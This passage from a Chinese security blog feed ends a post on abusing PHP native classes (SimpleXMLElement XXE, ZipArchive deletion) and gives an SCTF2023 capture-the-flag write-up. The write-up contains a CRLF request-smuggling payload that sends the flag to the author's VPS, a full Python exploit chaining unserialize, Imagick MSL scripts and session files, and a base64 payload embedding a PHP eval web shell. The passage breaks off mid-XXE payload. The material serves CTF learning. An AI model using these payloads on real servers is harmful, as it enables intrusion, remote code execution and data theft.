$isPrefix &#x3D; false)</code></pre><p><img src="/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8.assets/20210329180252-eccb96c2-9075-1.png"></p><p>这里比较重要的是第三个参数，如果<code>data_is_url</code>设置为<code>true</code>那么可以实现远程xml文件的载入。第二个参数一般设置为2。第一个参数data可以设置为payliad的url地址用于进入外部实体url。或者xml文档字符串也可以。</p><p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p><h3 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h3><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049636.png" alt="image-20230725004824174"></p><p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE &#x3D; 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;

&lt;h2 id=&quot;PHP原生类相关利用&quot;&gt;&lt;a href=&quot;#PHP原生类相关利用&quot; class=&quot;headerlink&quot; title=&quot;PHP原生类相关利用&quot;&gt;&lt;/a&gt;PHP原生类相关</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>SCTF2023</title>
    <link href="https://mizore.site/article/SCTF2023/SCTF2023/"/>
    <id>https://mizore.site/article/SCTF2023/SCTF2023/</id>
    <published>2023-07-23T11:54:29.033Z</published>
    <updated>2024-11-24T16:52:19.878Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="SCTF2023"><a href="#SCTF2023" class="headerlink" title="SCTF2023"></a>SCTF2023</h1><p>太难了，一题能卡我一天😭😭😭，对于一些东西的理解还是太浅了。题目做起来都好吃力。</p><h3 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a>ezcheck1n</h3><p>这题的考点是请求走私</p><p>首先是代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$FLAG &#x3D; &quot;flag&#123;fake_flag&#125;&quot;;@file_get_contents(&quot;http:&#x2F;&#x2F;&quot;.$_GET[&#39;url&#39;].$FLAG);# but it&#39;s not the real flag# beacuse someone say this year is not 2023 !!! like the post?show_source(&#39;.&#x2F;2023.php&#39;);$a &#x3D; file_get_contents(&#39;.&#x2F;post.jpeg&#39;);echo &#39;&lt;img src&#x3D;&quot;data:image&#x2F;jpeg;base64,&#39; . base64_encode($a) . &#39;&quot;&gt;&#39;;# notice -&gt; time# How should you get to where the flag is, the middleware will not forward requests that are not 2023?&gt;</code></pre><p>首先是<code>file_get_contents</code>，这个函数可以把文件读入一个字符串。</p><p>它的第一个参数，同时也是必须参数是<code>path</code>这个path可以是本地文件路径也可以是网络地址。<code>file_get_contents</code>函数在设计上把一切的网络资源视作文件，无论本地，或者远程服务器的。然而在大多数PHP教程网站并没有说明这一点，让我以为只能其只能读取本地文件。</p><p>也就是说，<strong>我们可以通过其来请求一个网络地址，变抓取返回包。</strong>这是一个很关键的点，可惜我做的时候只是简单的理解为只能读本地文件，导致我看WP的时候都卡了好久😭也无法理解<code>@file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG);</code>这一句话的真正含义。</p><p>接着下面的代码就是简单地展示了这张图片</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307231952692.png"></p><p>根据图片提示，我们应该是要访问2022文件，但是直接访问不行。提示也给了说中间件会拦截请求，Wappalyzer可以看到该站是apache 2.4.54，直接搜索漏洞可得CVE-2023-25690<a href="https://xz.aliyun.com/t/12345">请求走私漏洞</a></p><p>简单来说就是apache在处理的时候会将URI后面的一部分解码解析后直接拼接到请求包中再传递给后端服务器。因为控制字符也会直接解析，所以有机会进行CRLF注入，从而进行请求走私。</p><p>再看一下题目中的<code>file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG)</code>，参数url使GET方式获取值同时在请求的时候会带上FLAG变量，但是在2023.php中的flag是一个fake flag</p><p>所以首先构造一个请求包去访问2022.php文件，但是直接访问的话是没有回显的。这里就要利用到<code>@file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG);</code>因为在2023.php中的<code>file_get_contents();</code>并无实际作用，所以可以推测在2022.php中也存在着一个<code>file_get_contents()</code>所以在请求走私的时候，给url传值为我们自己的VPS地址，同时在VPS上使用nc开启端口监听，就能捕捉到<code>file_get_contents()</code>的请求包同时得到flag</p><blockquote><p>CRLF 指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。</p></blockquote><p>构造如下payload</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;115.239.215.75:8082&#x2F;2023&#x2F;%20HTTP&#x2F;1.1%0D%0AHOST:127.0.0.1%0D%0A%0D%0AGET%20&#x2F;2022.php%3Furl&#x3D;1xx.xxx.5.xxx:2333即&#x2F;2023&#x2F; HTTP&#x2F;1.1&#x2F;r&#x2F;nHOST:localhost&#x2F;r&#x2F;n&#x2F;r&#x2F;n GET &#x2F;2022.php?url&#x3D;VPS_ADDR:PORT</code></pre><p>我一开始构造的时候在最末尾的地方多加了HTTP&#x2F;1.1，导致走私失败。犯了这种低级错误。。还检查了好久才检查出来太傻比了😭😭😭</p><p>还有就是直接在web界面的url传参就可以了，我一开始还傻傻的想用BP做，BP做起来反而更麻烦。。。</p><p>然后就是使用url编码的时候不要把斜杠也一起编码了，这样会导致404 &#x3D; &#x3D;这个要记住，防止下次遇到相似情况会被坑。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230230324.png" alt="image-20230707024905076"></p><h3 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h3><p>这题乍一看只是个很简单的反序列化伪造，但是实际上涉及到反序列化，ImageMagick扩展，msl脚本语言，XXE包伪造。byd看wp的时候直接给我干蒙了，怎么会涉及到这么冷门的东西，这就是web吗😭😭😭</p><p>看看源码</p><p>首先是前面这两个</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">ini_set(&#39;open_basedir&#39;, __DIR__.&quot;:&#x2F;tmp&quot;);define(&quot;FUNC_LIST&quot;, get_defined_functions());</code></pre><p><code>ini_set</code>是对php.ini里的值进行设置，且只在函数执行时生效，在脚本结束时失效。相当于是对当前文件的一个临时设置。其中<code>open_basedir</code>是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域。所以这行的意思就是把我们的可以活动的目录限制在<code>tmp</code>目录下。当时的我以为只是把当前目录设置为<code>tmp</code>，并不知道有限制用户活动范围的意思。</p><p><code>get_defined_functions</code> ： 返回所有已定义函数的数组，包含了所有已定义的函数，包括内置&#x2F;用户定义的函数。</p><p>接着是反序列化的主体</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">class fumo_backdoor &#123;    public $path &#x3D; null;    public $argv &#x3D; null;    public $func &#x3D; null;    public $class &#x3D; null;        public function __sleep() &#123;        if (            file_exists($this-&gt;path) &amp;&amp;             preg_match_all(&#39;&#x2F;[flag]&#x2F;m&#39;, $this-&gt;path) &#x3D;&#x3D;&#x3D; 0        ) &#123;            readfile($this-&gt;path);        &#125;    &#125;    public function __wakeup() &#123;        $func &#x3D; $this-&gt;func;        if (            is_string($func) &amp;&amp;             in_array($func, FUNC_LIST[&quot;internal&quot;])        ) &#123;            call_user_func($func);        &#125; else &#123;            $argv &#x3D; $this-&gt;argv;            $class &#x3D; $this-&gt;class;                        new $class($argv);        &#125;    &#125;&#125;$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];$data &#x3D; $_REQUEST[&#39;data&#39;];switch ($cmd) &#123;    case &#39;unserialze&#39;:        unserialize($data);        break;        case &#39;rm&#39;:        system(&quot;rm -rf &#x2F;tmp 2&gt;&#x2F;dev&#x2F;null&quot;);        break;        default:        highlight_file(__FILE__);        break;&#125;</code></pre><p>switch部分的代码提供两个功能，分别是反序列化化和删除当前目录文件。这里提供一个删除功能，我是没太搞清楚这个是为了干什么。经过测试做题前不清楚文件有时候也能正常出flag。应该是临时文件夹经常被写入东西，所以做题前需要清除一下防止干扰。</p><p>接着便是反序列化环节了</p><p>首先是<code>__weekup</code>可以通过反序列化触发，同时在<code>__weekup</code>函数里面有一个<code>call_user_func()</code>，这个函数会把第一个函数当做回调函数进行调用，其它参数当做回调函数的参数。因为题目中只给了一个参数，所以这里是一个无参调用。需要注意的是，由于if条件限制<code>call_user_func()</code>只能调用PHP的内部方法</p><p>接着是<code>__sleep()</code>，这个函数可以<code> readfile()</code>该函数读入一个文件并写入到输出缓冲。简单来说就是读文件并输出。在tmp文件夹下我们能读到的文件除了临时文件就是session文件了。同时，当下环境内唯一存在序列化的地方就是session了，所以要通过控制session进而来控制<code>__sleep()</code>的触发</p><p>按照正常流程来是通过phpinfo收集信息</p><pre class="line-numbers language-none"><code class="language-none">O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:7:&quot;phpinfo&quot;;s:5:&quot;class&quot;;N;&#125;</code></pre><p>这里有一个小坑就是构造无参调用的pop链的时候直接使用函数名即可，不需要括号。</p><p>可以看到用了imagick扩展</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307231947103.png" alt="image-20230707211655131"></p><p>这题的其实与CISCN2022决赛的<a href="https://blog.wm-team.cn/index.php/archives/38/">一题</a>基本一样。</p><p>后面的解题步骤如下</p><ol><li>反序列化ImageMagick 利用msl类型和vid:msl:&#x2F;tmp&#x2F;php* 执行msl脚本</li><li>msl 用 mvg格式 把&#x2F;flag 读到&#x2F;tmp&#x2F;b</li><li>msl用inline可以base64 和8bim格式 写入一个session文件，用来反序列化</li><li>调用session_start，session被反序列化，休眠的时候被序列化触发sleep 读&#x2F;tmp&#x2F;b</li></ol><p>感觉没做过或者看过原题的话根本做不出来吧。。。太难了</p><p>按照github里的那篇文章可以知道</p><p><code>imagick</code>类在初始化的时候、可以执行<code>Magick Scripting Language</code>，即MSL脚本。所以可以在临时文件中写入MSL脚本，然后在<code>imagick</code>类初始化的时候执行临时文件，将其内容写入session文件。再触发<code>__sleep</code>包含读取session文件获得我们想要的内容。</p><blockquote><p>写入文件时须注意以下几点：</p><ol><li>因为<code>imagick</code>对文件格式解析较严，需要写入的文件必须是其支持的图片格式，如jpg、gif、ico等。如果直接插入<code>session</code>数据，会导致解析图片错误，导致文件无法写入。</li><li><code>php</code>对<code>session</code>的格式解析也较为严格。数据尾不可以存在脏数据，否则<code>session</code>解析错误会无法触发<code>__sleep</code>。</li></ol></blockquote><blockquote><p>MSL 代表 Magick 脚本语言。 它是一种内置的 ImageMagick 语言，有助于读取图像、执行图像处理任务以及将结果写回文件系统。</p></blockquote><p>首先是<code>cmd=rm</code>清除一下临时文件</p><p>编写反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpclass fumo_backdoor &#123;    public $path &#x3D; null;    public $argv &#x3D; null;    public $func &#x3D; null;    public $class &#x3D; null;&#125;$a&#x3D;new fumo_backdoor();$a-&gt;class&#x3D;&quot;imagick&quot;;$a-&gt;argv&#x3D;&quot;vid:msl:&#x2F;tmp&#x2F;php*&quot;;echo serialize($a);</code></pre><p><code>vid:msl:/tmp/php*</code>中的<code>vid</code>指的是使用vid方案，这种方案可以用于解析掩码（即可以用*来匹配）通过使用 vid: 方案，我们可以将临时文件包含在 MSL 内容中，而无需知道其名称.</p><p><code>msl</code>则是指使用MSL对文件进行解析，同时MSL脚本使用XML文档进行编写与传输。</p><p>接下来是XML文档的编写</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;image&gt;&lt;read filename&#x3D;&quot;inline:data:&#x2F;&#x2F;image&#x2F;x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw&#x2F;cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czo4OiIvdG1wL3NzcyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30K&quot; &#x2F;&gt;&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sess_se&quot;&gt;&lt;&#x2F;image&gt;</code></pre><p>其中base64的内容是ppm格式的图片，并在结尾插入了脏数据。</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230217404.png" alt="image-20230708005741597"></p><p>构造请求包</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?data&#x3D;O:13:%22fumo_backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;s:17:%22vid:msl:&#x2F;tmp&#x2F;php*%22;s:4:%22func%22;N;s:5:%22class%22;s:7:%22imagick%22;%7D&amp;cmd&#x3D;unserialze HTTP&#x2F;1.1HOST: 182.92.6.230:18080Accept:*&#x2F;*Content-Type: multipart&#x2F;form-data;boundary&#x3D;------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979Content-Disposition: form-data; name&#x3D;&quot;swarm&quot;; filename&#x3D;&quot;swarm.msl&quot;Content-Type: application&#x2F;octet-stream&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;image&gt;&lt;read filename&#x3D;&quot;inline:data:&#x2F;&#x2F;image&#x2F;x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw&#x2F;cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czo4OiIvdG1wL3NzcyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30K&quot; &#x2F;&gt;&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sess_se&quot;&gt;&lt;&#x2F;image&gt;--------------------------c32aaddf3d8fd979</code></pre><p>第一个请求包在反序列化进行了<code>imagick</code>类初始化。同时传输XML文档，写入文件sess_se，这样在session_start的时候cookie设置为PHPSESSID&#x3D;se的时候就可以直接读取该文件内容进行反序列化进入readfile。</p><p>接着构造第二个请求包把flag读到tmp的sess_s4mmy文件中，用于后续反序列化的包含</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;image&gt;&lt;read filename&#x3D;&quot;mvg:&#x2F;flag&quot; &#x2F;&gt;&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sss&quot; &#x2F;&gt;&lt;&#x2F;image&gt;</code></pre><p>所以总共是有两个临时文件一个是用于session反序列化，另一个是用于写入flag，并在反序列化的时候包含输出。</p><p>一开始没理清这个逻辑，我饶了好久😭😭😭</p><p>第二个请求包</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?data&#x3D;O:13:%22fumo_backdoor%22:4:%7Bs:4:%22path%22;N;s:4:%22argv%22;s:17:%22vid:msl:&#x2F;tmp&#x2F;php*%22;s:4:%22func%22;N;s:5:%22class%22;s:7:%22imagick%22;%7D&amp;cmd&#x3D;unserialze HTTP&#x2F;1.1HOST: 182.92.6.230:18080Accept:*&#x2F;*Content-Type: multipart&#x2F;form-data; boundary&#x3D;------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979Content-Disposition: form-data; name&#x3D;&quot;swarm&quot;; filename&#x3D;&quot;swarm.msl&quot;Content-Type: application&#x2F;octet-stream&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;image&gt;&lt;read filename&#x3D;&quot;mvg:&#x2F;flag&quot; &#x2F;&gt;&lt;write filename&#x3D;&quot;&#x2F;tmp&#x2F;sss&quot; &#x2F;&gt;&lt;&#x2F;image&gt;------------------------c32aaddf3d8fd979</code></pre><p>最后再携带PHPSESSID&#x3D;se去同时执行session_start()触发<code>__sleep</code>包含flag文件</p><p>这里我自己手动试了两天都不能出flag，但是网上的一个脚本能把flag跑出来，还是研究一下脚本吧😭😭😭太难了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests, base64, timeSERVER_ADDR &#x3D; &quot;http:&#x2F;&#x2F;182.92.6.230:18080&#x2F;&quot;def del_tempd() -&gt; None:    resp &#x3D; requests.post(SERVER_ADDR, data&#x3D;&#123;&quot;cmd&quot;:&quot;rm&quot;,&#125;)    print(resp.status_code)def write_file(xml: str):    # Imagick(&quot;vid:msl:&#x2F;tmp&#x2F;php*&quot;)    unserialize &#x3D; base64.b64decode(b&#39;TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7YToxOntpOjA7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO31zOjQ6ImZ1bmMiO047czo1OiJjbGFzcyI7czo3OiJJbWFnaWNrIjt9&#39;)    resp &#x3D; requests.post(SERVER_ADDR,files&#x3D;&#123;&quot;file&quot;:(&quot;exec1.msl&quot;,xml)&#125;,data&#x3D;&#123;&quot;cmd&quot;:&quot;unserialze&quot;,&quot;data&quot;:unserialize&#125;)    print(resp.status_code)def show_phpinfo() -&gt; None:    print(SERVER_ADDR + &quot;?cmd&#x3D;unserialze&amp;data&#x3D;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;)def get_new_php_session() -&gt; str:    resp &#x3D; requests.get(SERVER_ADDR + &quot;?cmd&#x3D;unserialze&amp;data&#x3D;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;)    return resp.headers.get(&quot;Set-Cookie&quot;)[10:42]def session_start(session_id: str) -&gt; None:    resp &#x3D; requests.get(SERVER_ADDR + &quot;?cmd&#x3D;unserialze&amp;data&#x3D;O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3Bs%3A8%3A%22%2Ftmp%2Fyyz%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D&quot;, cookies&#x3D;&#123;&quot;PHPSESSID&quot;: session_id&#125;)    print(resp.text)del_tempd()time.sleep(2)session_id &#x3D; get_new_php_session()print(session_id)time.sleep(2)del_tempd()time.sleep(2)xml &#x3D; f&#39;&#39;&#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;group&gt;&lt;image &gt; &lt;read filename&#x3D;&quot;mvg:&#x2F;flag[20x20+20+20]&quot;&#x2F;&gt;&lt;&#x2F;image&gt;&lt;write filename&#x3D;&quot;mvg:&#x2F;tmp&#x2F;yyz&quot;&#x2F;&gt;&lt;&#x2F;group&gt;&#39;&#39;&#39;xml2 &#x3D; f&#39;&#39;&#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;group&gt;&lt;image &gt;&lt;read filename&#x3D;&quot;inline:data:text&#x2F;8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9&quot;&#x2F;&gt;&lt;&#x2F;image&gt;&lt;write filename&#x3D;&quot;8BIM:&#x2F;tmp&#x2F;sess_&#123;session_id&#125;&quot;&#x2F;&gt;&lt;&#x2F;group&gt;&#39;&#39;&#39;write_file(xml)time.sleep(3)write_file(xml2)time.sleep(3)session_start(session_id)</code></pre><p>这个脚本一共有五个功能，分别是写文件（xml），删除文件（即cmd&#x3D;rm），获取一个新的session（session_start），session_start（即触发_sleep的最后一步），展示phpinfo界面。</p><p>按照脚本的步骤来，第一步是清除临时文件，然后生成一个新的session</p><p>此时反序列化数据如下</p><pre class="line-numbers language-none"><code class="language-none">O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:14:&quot;vid:msl:&#x2F;tmp&#x2F;a&quot;;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;</code></pre><p>然后输出获得的session</p><p>再次清除临时文件</p><p>开始写入xml文档，第一次写入的文档内容如下</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;group&gt;&lt;image &gt; &lt;read filename&#x3D;&quot;mvg:&#x2F;flag[20x20+20+20]&quot;&#x2F;&gt;&lt;&#x2F;image&gt;&lt;write filename&#x3D;&quot;mvg:&#x2F;tmp&#x2F;yyz&quot;&#x2F;&gt;&lt;&#x2F;group&gt;</code></pre><p>反序列化内容如下</p><pre class="line-numbers language-none"><code class="language-none">O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;a:1:&#123;i:0;s:17:&quot;vid:msl:&#x2F;tmp&#x2F;php*&quot;;&#125;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;</code></pre><p>第二次写入内容如下</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;group&gt;&lt;image &gt;&lt;read filename&#x3D;&quot;inline:data:text&#x2F;8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9&quot;&#x2F;&gt;&lt;&#x2F;image&gt;&lt;write filename&#x3D;&quot;8BIM:&#x2F;tmp&#x2F;sess_&#123;session_id&#125;&quot;&#x2F;&gt;&lt;&#x2F;group&gt;</code></pre><p>反序列化内容如下</p><pre class="line-numbers language-none"><code class="language-none">yyz|O:13:&quot;fumo_backdoor&quot;:2:&#123;s:4:&quot;path&quot;;s:8:&quot;&#x2F;tmp&#x2F;yyz&quot;;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;&#125;</code></pre><p>最后是带出flag，反序列化内容如下</p><pre class="line-numbers language-none"><code class="language-none">O:13:&quot;fumo_backdoor&quot;:2:&#123;s:4:&quot;path&quot;;s:8:&quot;&#x2F;tmp&#x2F;yyz&quot;;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;&#125;</code></pre><p>可能是手工构造存在什么小细节不好把握吧，太难搞了，以后有这种题目还是尽量通过脚本来接提拔。。。太难受了，这题总共做了三天差不多😭😭😭</p><h3 id="pypyp？"><a href="#pypyp？" class="headerlink" title="pypyp？"></a>pypyp？</h3><p>又是很坑爹的一题😭😭😭，前前后后一共做了四天差不多。不过也学到了许多知识</p><p>一进入页面提示session not started，题目提示&#x2F;app&#x2F;app.py，访问看看</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218997.png" alt="image-20230713002110951"></p><p>似乎不能直接利用。。。到这里就没啥思路了</p><p>最后上网查了一下WP才知道这里的考点是PHP的<code>session_upload_progress</code>强制生成session，因为题目提示里有个app.py,我就以为网站都是用python编写的。这里是我思维局限了，没去Wappalyzer看一下这个网站用的是什么语言。其实在这个session页面用的是PHP编写。</p><p><code>session_upload_progress</code>是个老考点了，不过太久没做题我就把这个知识点给忘了😓</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218992.png" alt="image-20230713001809914"></p><p>因为直接发送请求包并不会在服务器上创建会话，所以在这里利用<code>session_upload_progress</code>的特点来从服务器上强制创建一个session，使用如下脚本来构造一个上传文件与请求进度同时存在的文件</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;115.239.215.75:8081&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>这里要抓包在请求包中添加<code>Cookie: PHPSESSID</code>才可以</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218663.png" alt="image-20230713162129739"></p><p>过去之后获得源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    error_reporting(0);    if(!isset($_SESSION))&#123;        die(&#39;Session not started&#39;);    &#125;    highlight_file(__FILE__);    $type &#x3D; $_SESSION[&#39;type&#39;];    $properties &#x3D; $_SESSION[&#39;properties&#39;];    echo urlencode($_POST[&#39;data&#39;]);    extract(unserialize($_POST[&#39;data&#39;]));    if(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;    $object &#x3D; unserialize(urldecode($properties));    $object -&gt; sctf();    exit();    &#125; else if(is_array($properties))&#123;        $object &#x3D; new $type($properties[0],$properties[1]);    &#125; else &#123;        $object &#x3D; file_get_contents(&#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&#39;.$properties);    &#125;    echo &quot;this is the object: $object &lt;br&gt;&quot;;?&gt;</code></pre><p>看起来有点复杂，一行一行看下去</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    error_reporting(0);    if(!isset($_SESSION))&#123;        die(&#39;Session not started&#39;);    &#125;&#x2F;&#x2F;判断是否有session，若无则直接退出    highlight_file(__FILE__);    $type &#x3D; $_SESSION[&#39;type&#39;];    $properties &#x3D; $_SESSION[&#39;properties&#39;];&#x2F;&#x2F;在session读取两个属性的值并赋值    echo urlencode($_POST[&#39;data&#39;]);&#x2F;&#x2F;可控数据data    extract(unserialize($_POST[&#39;data&#39;]));&#x2F;&#x2F;对data进行反序列化。extract，可以将数组中的键值对转换为变量和对应的值，可以利用此函数进行变量覆盖    if(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;&#x2F;&#x2F;判断，若properties为字符串且能反序列化，则进入如下判断    $object &#x3D; unserialize(urldecode($properties));&#x2F;&#x2F;将object设置为properties的反序列化对象    $object -&gt; sctf();&#x2F;&#x2F;调用sctf()方法    exit();    &#125; else if(is_array($properties))&#123;        $object &#x3D; new $type($properties[0],$properties[1]);&#x2F;&#x2F;若properties方法是数组，则把type当做类名，properties的前两个值当做参数实例化一个类    &#125; else &#123;        $object &#x3D; file_get_contents(&#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&#39;.$properties);&#x2F;&#x2F;通过内网读取文件，其中文件由properties的值决定    &#125;    echo &quot;this is the object: $object &lt;br&gt;&quot;;&#x2F;&#x2F;最后会由echo输出object内容?&gt;</code></pre><p>一开始看这里我的想法是可能需要控制cookie中的type和properties中的值，或者是不是可以构造一个SCTF方法，在反序列化的时候进行应用。但是很快发现这样行不通，不过type和properties的值可以通过extract函数控制，这样的话我们就可以控制if的条件判断。</p><p>然后就是data的反序列化，这里又有个问题，就是在这段源码里是没有魔术方法的，所以不是按照正常的反序列化的路来走，而是要利用原生类进行反序列化。（又是新的知识点）</p><p>这里利用的是SimpleXMLElement进行反序列化，可以实现远程xml文件的载入。</p><p>所以要利用这个点来读文件先看看</p><p>反序列化的点在if的第二个分支上，先读一个app.py</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$class&#x3D;&#39;SimpleXMLElement&#39;;$xml&#x3D;&#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  